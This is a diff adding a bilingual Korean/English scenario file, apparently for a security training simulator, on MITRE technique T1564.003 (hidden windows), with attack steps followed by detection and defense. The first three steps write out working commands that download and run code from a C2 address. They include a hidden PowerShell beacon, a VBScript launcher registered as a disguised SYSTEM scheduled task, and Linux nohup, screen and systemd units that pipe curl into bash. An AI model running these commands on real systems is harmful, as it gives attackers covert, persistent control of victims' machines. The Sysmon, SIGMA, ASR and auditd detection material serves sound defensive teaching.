@@ -1,0 +1,166 @@
+{
+  "id": "T1564.003",
+  "title": "Hidden Window 시뮬레이션",
+  "titleEn": "Hidden Window Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "⚡ PowerShell Hidden", "labelEn": "⚡ PowerShell Hidden", "steps": [0] },
+    { "label": "📜 VBScript Hidden", "labelEn": "📜 VBScript Hidden", "steps": [1] },
+    { "label": "🐧 Linux 백그라운드", "labelEn": "🐧 Linux Background", "steps": [2] },
+    { "label": "🔍 탐지 & 방어", "labelEn": "🔍 Detection & Defense", "steps": [3, 4] }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker\n(Launcher)", "x": 50, "y": 80 },
+    { "id": "vbs", "label": "VBScript\nLauncher", "x": 180, "y": 30 },
+    { "id": "hidden_ps", "label": "Hidden\nPowerShell", "x": 180, "y": 130 },
+    { "id": "payload", "label": "Payload\nExecution", "x": 330, "y": 80 },
+    { "id": "c2", "label": "C2\nServer", "x": 480, "y": 80 }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "vbs", "minStep": 1 },
+    { "from": "attacker", "to": "hidden_ps", "minStep": 0 },
+    { "from": "vbs", "to": "payload", "minStep": 1 },
+    { "from": "hidden_ps", "to": "payload", "minStep": 0 },
+    { "from": "payload", "to": "c2", "minStep": 0 }
+  ],
+  "desktopIcons": [
+    { "name": "PowerShell", "icon": "⚡" },
+    { "name": "Task Manager", "icon": "📊" },
+    { "name": "launcher.vbs", "icon": "📜" },
+    { "name": "Process Monitor", "icon": "🔍" },
+    { "name": "Event Viewer", "icon": "📋" }
+  ],
+  "steps": [
+    {
+      "cmd": "# PowerShell Hidden Window 실행\npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command {\n    $wc = New-Object Net.WebClient\n    $payload = $wc.DownloadString('http://198.51.100.77/beacon.ps1')\n    IEX $payload\n    while($true) {\n        Start-Sleep -Seconds 60\n        $wc.DownloadString('http://198.51.100.77/tasks') | IEX\n    }\n}\n\n# Start-Process로도 Hidden 실행 가능\nStart-Process powershell -ArgumentList '-ep bypass -f C:\\temp\\persist.ps1' -WindowStyle Hidden",
+      "out": "[프로세스 정보]\nPID: 2340\nImage: powershell.exe\nCommandLine: -WindowStyle Hidden -ExecutionPolicy Bypass -Command {...}\nParentImage: explorer.exe (PID 1204)\nWindow: HIDDEN (MainWindowHandle = 0)\nWindowTitle: (없음)\n\n[네트워크 활동]\nDestination: 198.51.100.77:80\nProtocol: HTTP\nInterval: 60초마다 비콘\nPayload: beacon.ps1 다운로드 + 실행\n\n[사용자 관점]\n- 화면에 아무 창도 표시되지 않음\n- 작업 표시줄에 아이콘 없음\n- Ctrl+Alt+Del → 작업 관리자에서만 확인 가능\n- 시스템 트레이에 PowerShell 아이콘 없음",
+      "def": "[Sysmon Event ID 1] Process powershell.exe created with -WindowStyle Hidden flag",
+      "defAction": "Tool: PowerShell -WindowStyle Hidden\nProcess: powershell.exe (PID 2340)\nWindow State: HIDDEN (MainWindowHandle = 0)\nCommandLine: -WindowStyle Hidden -ep bypass\nNetwork: HTTP beacon to 198.51.100.77 every 60s\nUser Visibility: None (no window, no taskbar, no tray)\nSysmon Event: 1 (ProcessCreate with Hidden flag)\nRisk Level: Critical\nAction: Kill process, block C2 IP, investigate parent chain",
+      "desc": "PowerShell의 -WindowStyle Hidden 매개변수는 콘솔 창을 화면에 표시하지 않습니다. 사용자는 프로세스가 실행 중인지 전혀 알 수 없으며, 60초마다 C2 서버와 통신합니다.",
+      "descEn": "PowerShell's -WindowStyle Hidden parameter prevents the console window from appearing on screen. Users cannot tell the process is running, while it beacons to C2 every 60 seconds.",
+      "stepTitle": "PowerShell -WindowStyle Hidden으로 은밀한 C2 비콘",
+      "stepTitleEn": "Stealthy C2 Beacon via PowerShell -WindowStyle Hidden",
+      "feynman": "배우(PowerShell)가 무대 뒤(Hidden Window)에서 연기합니다. 관객(사용자)은 무대 위에 아무도 없다고 생각하지만, 뒤에서 배우가 본부(C2)와 끊임없이 연락하고 있습니다. 관객이 알아차리려면 극장 관리실(작업 관리자)에 가야 합니다.",
+      "feynmanEn": "An actor (PowerShell) performs backstage (Hidden Window). The audience (user) thinks the stage is empty, but the actor constantly communicates with headquarters (C2) behind the scenes. The audience must visit the theater control room (Task Manager) to notice.",
+      "expert": "PowerShell의 -WindowStyle Hidden은 STARTUPINFO 구조체의 wShowWindow를 SW_HIDE(0)로 설정합니다. CreateProcess API에서 dwCreationFlags에 CREATE_NO_WINDOW를 추가할 수도 있습니다. MainWindowHandle이 0인 프로세스를 탐지하되, 정상적인 서비스와 시스템 프로세스도 창이 없으므로 프로세스 이름과 커맨드라인을 함께 분석해야 합니다. Sysmon Event ID 1의 CommandLine에서 '-WindowStyle Hidden' 또는 '-w hidden' 패턴을 SIGMA 규칙으로 탐지합니다.",
+      "expertEn": "PowerShell -WindowStyle Hidden sets STARTUPINFO wShowWindow to SW_HIDE(0). CreateProcess can also use CREATE_NO_WINDOW flag. Detect MainWindowHandle=0 processes, but legitimate services also have no windows, so analyze process names and command lines together. SIGMA rules detect '-WindowStyle Hidden' patterns in Sysmon Event ID 1 CommandLine.",
+      "defTooltip": "🔐 PowerShell Hidden Window! 화면에 아무것도 안 보임!",
+      "defTooltipEn": "🔐 PowerShell Hidden Window! Nothing visible on screen!",
+      "hackerLog": { "title": "hidden_ps.log", "lines": ["[10:00:00] PowerShell -WindowStyle Hidden 시작", "[10:00:02] C2 연결: 198.51.100.77:80", "[10:00:03] beacon.ps1 다운로드 + 실행", "[10:01:00] 첫 번째 비콘 (60초 간격)"] },
+      "terms": [
+        { "term": "SW_HIDE", "def": "Windows ShowWindow 상수(0), 창을 완전히 숨김" },
+        { "term": "MainWindowHandle", "def": "프로세스의 주 창 핸들, 0이면 보이는 창이 없음" }
+      ]
+    },
+    {
+      "cmd": "# VBScript를 이용한 숨겨진 CMD/PowerShell 실행\n# launcher.vbs\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"cmd /c powershell -ep bypass -f C:\\temp\\payload.ps1\", 0, False\n\n# 스케줄러로 VBS 등록 (지속성 확보)\nschtasks /create /tn \"SystemHealthCheck\" /tr \"wscript.exe C:\\temp\\launcher.vbs\" /sc hourly /ru SYSTEM /f",
+      "out": "[VBScript 실행]\nFile: C:\\temp\\launcher.vbs\nAction: WScript.Shell.Run with intWindowStyle=0\n  → cmd.exe 숨겨진 창으로 실행\n  → powershell.exe 자식 프로세스 (역시 숨겨짐)\n\n[프로세스 체인]\nwscript.exe (PID 5560) — 창 없음\n  └→ cmd.exe (PID 5570) — 숨겨진 창 (intWindowStyle=0)\n     └→ powershell.exe (PID 5580) — payload.ps1 실행\n\n[스케줄러 등록]\nTask: SystemHealthCheck\nTrigger: 매시간\nAction: wscript.exe launcher.vbs\nRun As: SYSTEM\n\n[위장]\n- 작업 이름: SystemHealthCheck (정상 작업처럼 보임)\n- VBScript: 직접 실행 대신 간접 실행으로 탐지 우회\n- SYSTEM 권한: 사용자 로그아웃 후에도 지속",
+      "def": "[Sysmon] Process chain: wscript.exe → cmd.exe → powershell.exe with hidden windows — scheduled task persistence",
+      "defAction": "Tool: VBScript WScript.Shell.Run (intWindowStyle=0)\nProcess Chain: wscript → cmd → powershell (all hidden)\nScheduled Task: SystemHealthCheck (hourly, SYSTEM)\nDisguise: Legitimate-sounding task name\nPersistence: Survives user logoff (SYSTEM context)\nSysmon Events: 1 (chain), 11 (VBS file create)\nRisk Level: Critical\nAction: Delete scheduled task, remove VBS, kill process chain",
+      "desc": "VBScript의 WScript.Shell.Run 두 번째 인자(0)는 숨겨진 창으로 프로세스를 실행합니다. 스케줄러에 등록하면 매시간 숨겨진 PowerShell이 자동 실행되는 지속적 위협이 됩니다.",
+      "descEn": "VBScript WScript.Shell.Run second parameter (0) launches processes with hidden windows. When registered as a scheduled task, hidden PowerShell auto-executes hourly, creating a persistent threat.",
+      "stepTitle": "VBScript 숨겨진 실행 + 스케줄러 지속성",
+      "stepTitleEn": "VBScript Hidden Execution + Scheduler Persistence",
+      "feynman": "무대 감독(VBScript)이 배우(cmd/PowerShell)에게 '뒤에서 연기해'라고 지시합니다(Run 0). 그리고 극장 스케줄에 '매시간 공연'으로 등록합니다(schtasks). 관객(사용자)이 퇴장(로그아웃)해도 무대 뒤 공연은 계속됩니다.",
+      "feynmanEn": "The stage director (VBScript) tells actors (cmd/PowerShell) to 'perform backstage' (Run 0). Then registers 'hourly performance' in the theater schedule (schtasks). The backstage show continues even after the audience (user) leaves (logoff).",
+      "expert": "VBScript의 WScript.Shell.Run(command, intWindowStyle, bWaitOnReturn)에서 intWindowStyle=0은 SW_HIDE에 해당합니다. 이 방식의 장점은 PowerShell의 -WindowStyle Hidden과 달리 커맨드라인에 Hidden 플래그가 남지 않아 탐지가 어렵습니다. 대신 Sysmon Event ID 1에서 wscript.exe의 자식 프로세스로 cmd.exe가 생성되는 패턴을 탐지합니다. ASR(Attack Surface Reduction) 규칙 'Block process creations originating from PSExec and WMI commands'와 'Block Office applications from creating child processes'로 VBScript 기반 실행을 제한할 수 있습니다.",
+      "expertEn": "VBScript WScript.Shell.Run with intWindowStyle=0 equals SW_HIDE. Unlike PowerShell's -WindowStyle Hidden, no Hidden flag appears in the command line, making detection harder. Instead, detect wscript.exe spawning cmd.exe via Sysmon Event ID 1. ASR rules can restrict VBScript-based execution.",
+      "defTooltip": "🔐 VBScript → CMD → PowerShell 숨겨진 체인!",
+      "defTooltipEn": "🔐 VBScript → CMD → PowerShell hidden chain!",
+      "hackerLog": { "title": "vbs_launcher.log", "lines": ["[10:10:00] launcher.vbs 실행", "[10:10:01] cmd.exe 숨겨진 창 (PID 5570)", "[10:10:02] powershell.exe 페이로드 (PID 5580)", "[10:10:05] 스케줄러 등록: SystemHealthCheck"] },
+      "terms": [
+        { "term": "intWindowStyle", "def": "VBScript Run 메서드의 창 스타일 인자, 0=숨김, 1=표시" },
+        { "term": "schtasks", "def": "Windows 작업 스케줄러 명령줄 도구, 자동 실행 작업 등록" }
+      ]
+    },
+    {
+      "cmd": "# Linux/macOS 백그라운드 숨겨진 실행\n# 1. nohup + & (터미널 종료 후에도 지속)\nnohup bash -c 'while true; do curl -s http://198.51.100.77/tasks | bash; sleep 300; done' &>/dev/null &\n\n# 2. screen 세션 (인터랙티브 숨김)\nscreen -dmS .system_update bash -c 'curl http://198.51.100.77/beacon.sh | bash'\n\n# 3. systemd 서비스 위장\ncat << 'EOF' > /etc/systemd/system/system-health.service\n[Unit]\nDescription=System Health Monitor\n[Service]\nExecStart=/bin/bash -c 'curl -s http://198.51.100.77/beacon.sh | bash'\nRestart=always\nRestartSec=300\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable --now system-health",
+      "out": "[nohup 백그라운드]\n[1] 23456\nnohup: ignoring input and appending output to 'nohup.out'\n→ 터미널 종료 후에도 5분마다 C2 통신\n→ 프로세스: bash (PID 23456)\n→ /proc/23456/fd/1 → /dev/null (출력 숨김)\n\n[screen 세션]\n→ screen 이름: .system_update (점 접두사로 숨김)\n→ screen -ls에서 숨겨진 세션 표시\n→ 분리된 세션으로 사용자에게 보이지 않음\n\n[systemd 서비스]\n→ 서비스: system-health.service\n→ 위장: System Health Monitor\n→ 5분마다 자동 재시작 (Restart=always)\n→ 부팅 시 자동 시작 (WantedBy=multi-user.target)\n→ systemctl list-units에서 정상 서비스처럼 보임",
+      "def": "[auditd] Background process with C2 communication detected — nohup + systemd service persistence",
+      "defAction": "Tool: nohup, screen, systemd\nnohup: PID 23456, /dev/null redirect, 5min interval\nscreen: .system_update (dot prefix = hidden session)\nsystemd: system-health.service (disguised as monitor)\nC2: 198.51.100.77 (HTTP)\nPersistence: systemd WantedBy=multi-user.target\nRisk Level: Critical\nAction: Stop service, remove unit file, kill processes, check crontab",
+      "desc": "Linux에서 nohup, screen, systemd 서비스를 사용하여 백그라운드에서 숨겨진 프로세스를 실행합니다. 특히 systemd 서비스로 위장하면 부팅 시 자동 시작되는 지속적 위협이 됩니다.",
+      "descEn": "Linux uses nohup, screen, and systemd services to run hidden background processes. Systemd service disguise enables auto-start at boot, creating a persistent threat.",
+      "stepTitle": "Linux nohup/screen/systemd 숨겨진 백그라운드 실행",
+      "stepTitleEn": "Linux Hidden Background via nohup/screen/systemd",
+      "feynman": "Linux에서는 3가지 방법으로 배우를 숨깁니다: 1) 터미널을 닫아도 뒤에서 공연 계속(nohup &), 2) 특수 무대(screen)에서 분리 공연, 3) 건물 관리 시스템(systemd)에 '건강 점검'으로 등록하여 매일 자동 공연. 세 번째가 가장 교묘합니다 - 관리 시스템 자체가 배우를 기동합니다.",
+      "feynmanEn": "Linux hides actors three ways: 1) Performance continues after closing the theater (nohup &), 2) Detached performance on a special stage (screen), 3) Register as 'health check' in building management (systemd) for daily auto-performance. The third is most cunning - the management system itself launches the actor.",
+      "expert": "nohup은 SIGHUP 신호를 무시하여 터미널 종료 시에도 프로세스가 유지됩니다. screen -dmS는 분리(detached) 모드로 세션을 생성하며, 점(.) 접두사 이름은 일부 도구에서 숨겨집니다. systemd 서비스는 가장 교묘한 방법으로, /etc/systemd/system/에 유닛 파일을 생성하면 systemctl list-units에서 정상 서비스처럼 표시됩니다. 탐지를 위해 auditd로 /etc/systemd/system/ 디렉토리 변경을 모니터링하고, 알려지지 않은 유닛 파일을 정기적으로 감사합니다. find /etc/systemd/system -name '*.service' -newer /etc/passwd로 최근 생성된 서비스를 탐지할 수 있습니다.",
+      "expertEn": "nohup ignores SIGHUP for process persistence after terminal close. screen -dmS creates detached sessions, dot prefix names hide from some tools. systemd services are most cunning - unit files in /etc/systemd/system/ appear as normal services. Monitor directory changes via auditd and audit unknown unit files. Use find to detect recently created services.",
+      "defTooltip": "🔐 nohup+screen+systemd 숨겨진 백그라운드 실행!",
+      "defTooltipEn": "🔐 nohup+screen+systemd hidden background execution!",
+      "hackerLog": { "title": "linux_hidden.log", "lines": ["[10:15:00] nohup bash C2 비콘 시작", "[10:15:02] screen .system_update 세션 생성", "[10:15:04] systemd system-health.service 등록", "[10:15:06] 모든 숨겨진 프로세스 활성화"] },
+      "terms": [
+        { "term": "nohup", "def": "No Hangup, SIGHUP 무시하여 터미널 종료 후에도 프로세스 유지" },
+        { "term": "systemd service", "def": "Linux 서비스 관리자의 유닛 파일, 프로세스 자동 시작/재시작 관리" }
+      ]
+    },
+    {
+      "cmd": "# Windows: 숨겨진 창 프로세스 탐지\n# Sysmon Event ID 1에서 -WindowStyle Hidden 탐지\nGet-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -FilterXPath \"*[System[EventID=1]]\" |\nWhere-Object { $_.Message -match 'WindowStyle.*Hidden|\\-w\\s+hidden' } |\nSelect-Object TimeCreated, @{N='CommandLine';E={($_.Message -split \"`n\" | Select-String 'CommandLine:').ToString().Trim()}}",
+      "out": "[Sysmon Hidden Window 탐지]\n\nTimeCreated             CommandLine\n-----------             -----------\n2026-03-01 10:00:00     powershell.exe -WindowStyle Hidden -ep bypass -c {...}\n2026-03-01 10:10:02     powershell.exe -w hidden -f C:\\temp\\persist.ps1\n2026-03-01 09:55:00     powershell.exe -Win Hidden -NoP -c \"IEX...\"\n\n[VBScript 간접 실행 탐지]\n프로세스 트리 분석:\n  wscript.exe (PID 5560)\n    └→ cmd.exe (PID 5570) — 부모가 wscript\n       └→ powershell.exe (PID 5580) — 숨겨진 실행\n\n[MainWindowHandle = 0 프로세스]\n정상 제외 후 의심 프로세스:\n- powershell.exe (PID 2340) — 창 없음 + 네트워크 활동\n- powershell.exe (PID 5580) — 창 없음 + wscript 자식\n\n[탐지 결과]\n- 직접 탐지: 3건 (-WindowStyle Hidden 패턴)\n- 간접 탐지: 1건 (VBScript 프로세스 체인)\n- 행위 탐지: 2건 (MainWindowHandle=0 + 네트워크)",
+      "def": "[SIEM] 6 hidden window processes detected — 3 direct (cmdline), 1 indirect (VBS chain), 2 behavioral",
+      "defAction": "Tool: Sysmon Event ID 1 + Process Analysis\nDirect Detection: 3 processes with -WindowStyle Hidden\nIndirect Detection: 1 VBScript process chain\nBehavioral Detection: 2 processes with MainWindowHandle=0 + network\nTotal Suspicious: 6 hidden processes\nSIGMA Patterns: WindowStyle Hidden, -w hidden, -Win Hidden\nRisk Level: Critical\nAction: Kill all 6 processes, forensic timeline, check persistence mechanisms",
+      "desc": "Sysmon Event ID 1의 CommandLine에서 -WindowStyle Hidden 패턴을 탐지하고, 프로세스 트리 분석으로 VBScript 간접 실행도 탐지합니다. MainWindowHandle=0인 프로세스의 네트워크 활동을 상관분석합니다.",
+      "descEn": "Detect -WindowStyle Hidden patterns in Sysmon Event ID 1 CommandLine, and VBScript indirect execution via process tree analysis. Correlate network activity of MainWindowHandle=0 processes.",
+      "stepTitle": "Sysmon + 프로세스 트리 + 행위 분석으로 탐지",
+      "stepTitleEn": "Detection via Sysmon + Process Tree + Behavioral Analysis",
+      "feynman": "극장 관리실(Sysmon)의 기록을 검색합니다: 1) 대본(CommandLine)에 '뒤에서 해'(Hidden)라고 적힌 공연 3건, 2) 감독(wscript)이 배우(cmd)를 통해 간접 지시한 1건, 3) 무대 위에 안 나오면서(창 없음) 외부와 통신하는(네트워크) 2건. 총 6건의 비밀 공연을 적발합니다.",
+      "feynmanEn": "Search theater control (Sysmon) records: 1) Three scripts (CommandLine) saying 'do it backstage' (Hidden), 2) One where the director (wscript) gave indirect orders through an actor (cmd), 3) Two not on stage (no window) while communicating externally (network). Total: 6 secret performances caught.",
+      "expert": "CommandLine 기반 탐지의 한계는 축약형입니다. PowerShell은 -WindowStyle의 축약으로 -w, -Win, -Window 등을 허용합니다. SIGMA 규칙에서 정규식 (-[Ww](in(dow)?)?\\s*(S(tyle)?)?\\s*[Hh](idden)?)으로 모든 변형을 매칭합니다. VBScript Run 0 방식은 CommandLine에 Hidden이 없으므로 프로세스 트리 분석(wscript → cmd → powershell)으로 탐지합니다. 추가로 Windows API의 GetWindowLong(GWL_STYLE)에서 WS_VISIBLE 비트가 없는 프로세스를 열거하여 숨겨진 창을 직접 탐지할 수도 있습니다.",
+      "expertEn": "CommandLine detection limitation: PowerShell allows abbreviations -w, -Win, -Window for -WindowStyle. SIGMA regex matches all variants. VBScript Run 0 has no Hidden in CommandLine, requiring process tree analysis (wscript→cmd→powershell). Additionally, enumerate processes without WS_VISIBLE bit via GetWindowLong(GWL_STYLE) for direct hidden window detection.",
+      "defTooltip": "🔐 6건 숨겨진 프로세스 탐지! 직접+간접+행위 분석!",
+      "defTooltipEn": "🔐 6 hidden processes detected! Direct+indirect+behavioral!",
+      "hackerLog": { "title": "detection.log", "lines": ["[10:25:00] Sysmon Hidden 패턴 3건 탐지", "[10:25:02] VBScript 프로세스 체인 1건 탐지", "[10:25:04] 행위 이상(창 없음+네트워크) 2건", "[10:25:06] 총 6건 숨겨진 프로세스 적발"] },
+      "terms": [
+        { "term": "WS_VISIBLE", "def": "Windows 스타일 비트, 설정되면 창이 화면에 표시됨" },
+        { "term": "SIGMA 규칙", "def": "SIEM에 독립적인 보안 로그 탐지 규칙 표준 형식" }
+      ]
+    },
+    {
+      "cmd": "# 종합 방어: ASR + Sysmon + GPO + 자동 탐지\n# 1. ASR 규칙 활성화\nSet-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Enabled\n# → Block process creations originating from WMI/PSExec\n\n# 2. Sysmon SIGMA 규칙\n# title: Hidden PowerShell Window\n# detection:\n#   selection: CommandLine|re: '-[Ww](in)?.*[Hh](idden)?'\n#   condition: selection\n\n# 3. GPO: wscript.exe 실행 제한\n# Software Restriction Policies → Disallowed: wscript.exe",
+      "out": "[ASR 규칙]\n✅ d1e49aac: WMI/PSExec에서 프로세스 생성 차단\n✅ 92e97fa1: Office에서 자식 프로세스 생성 차단\n✅ d4f940ab: Office에서 코드 주입 차단\n\n[Sysmon SIGMA 규칙]\n✅ Hidden PowerShell Detection:\n   - -WindowStyle Hidden (전체형)\n   - -w hidden (축약형)\n   - -Win Hidden (부분 축약)\n   → 모든 변형 매칭\n\n✅ VBScript Suspicious Chain:\n   - wscript.exe → cmd.exe/powershell.exe 프로세스 트리\n   → 간접 실행 탐지\n\n[GPO 정책]\n✅ wscript.exe: Disallowed (Software Restriction)\n✅ cscript.exe: Disallowed (Software Restriction)\n→ VBScript 기반 숨겨진 실행 원천 차단\n\n[Linux 방어]\n✅ auditd: execve 시스콜 모니터링\n✅ systemd 유닛 파일 변경 감사\n✅ crontab/at 정기 감사",
+      "def": "[SIEM] Full hidden window defense deployed — ASR rules, SIGMA detection, GPO restrictions, Linux auditd",
+      "defAction": "Tool: ASR + Sysmon SIGMA + GPO + auditd\nASR Rules: Block WMI/PSExec/Office child processes\nSIGMA: All -WindowStyle Hidden variants + VBScript chains\nGPO: wscript/cscript Disallowed\nLinux: auditd execve + systemd monitoring\nRisk Level: Mitigated\nAction: Continuous monitoring, periodic process audit, user awareness",
+      "desc": "ASR 규칙으로 의심스러운 프로세스 생성을 차단하고, SIGMA 규칙으로 숨겨진 창의 모든 변형을 탐지합니다. GPO로 wscript/cscript 실행을 제한하여 VBScript 기반 공격을 원천 차단합니다.",
+      "descEn": "ASR rules block suspicious process creation, SIGMA rules detect all hidden window variants, and GPO restricts wscript/cscript execution to prevent VBScript-based attacks at the source.",
+      "stepTitle": "ASR + SIGMA + GPO + auditd 종합 방어 체계",
+      "stepTitleEn": "Comprehensive Defense: ASR + SIGMA + GPO + auditd",
+      "feynman": "4가지 보안 장치를 설치합니다: 1) 무대 뒤 공연 금지 규정(ASR), 2) 대본에 '뒤에서 해'라는 지시가 있으면 자동 신고(SIGMA), 3) 특정 감독(wscript)의 극장 출입 금지(GPO), 4) Linux에서는 모든 공연 기록 의무화(auditd). 비밀 공연이 불가능해집니다.",
+      "feynmanEn": "Install 4 security measures: 1) Ban backstage performances (ASR), 2) Auto-report scripts saying 'do it backstage' (SIGMA), 3) Ban certain directors (wscript) from the theater (GPO), 4) On Linux, mandate all performance records (auditd). Secret performances become impossible.",
+      "expert": "ASR 규칙 d1e49aac는 WMI와 PSExec에서 시작된 프로세스 생성을 차단합니다. 92e97fa1은 Office 매크로의 자식 프로세스를 차단하여 Word/Excel → wscript → hidden powershell 체인을 방지합니다. GPO의 Software Restriction Policy로 wscript.exe를 Disallowed로 설정하면 VBScript 기반 공격을 원천 차단합니다. Linux에서는 auditd의 -a always,exit -F arch=b64 -S execve -k process_creation 규칙으로 모든 프로세스 실행을 기록하고, /etc/systemd/system/ 변경을 inotifywait로 실시간 모니터링합니다.",
+      "expertEn": "ASR rule d1e49aac blocks WMI/PSExec process creation. 92e97fa1 blocks Office macro child processes, preventing Word→wscript→hidden powershell chains. GPO Software Restriction Policy with wscript Disallowed blocks VBScript attacks at source. Linux auditd records all execve calls, inotifywait monitors /etc/systemd/system/ changes in real-time.",
+      "defTooltip": "🔐 ASR+SIGMA+GPO+auditd 종합 방어 완성!",
+      "defTooltipEn": "🔐 ASR+SIGMA+GPO+auditd comprehensive defense complete!",
+      "hackerLog": { "title": "defense_deploy.log", "lines": ["[10:35:00] ASR 규칙 3개 활성화", "[10:35:02] SIGMA Hidden Window 규칙 배포", "[10:35:04] GPO wscript/cscript 차단", "[10:35:06] Linux auditd + systemd 모니터링"] },
+      "terms": [
+        { "term": "ASR", "def": "Attack Surface Reduction, 공격 표면을 줄이는 Microsoft Defender 규칙 세트" },
+        { "term": "Software Restriction Policy", "def": "GPO를 통해 특정 실행 파일의 실행을 허용/차단하는 정책" }
+      ]
+    }
+  ],
+  "processTree": {
+    "name": "explorer.exe",
+    "pid": 1204,
+    "children": [
+      {
+        "name": "powershell.exe (HIDDEN)",
+        "pid": 2340,
+        "children": [
+          { "name": "conhost.exe", "pid": 2345, "children": [] }
+        ]
+      },
+      {
+        "name": "wscript.exe",
+        "pid": 5560,
+        "children": [
+          {
+            "name": "cmd.exe (HIDDEN)",
+            "pid": 5570,
+            "children": [
+              { "name": "powershell.exe", "pid": 5580, "children": [] }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
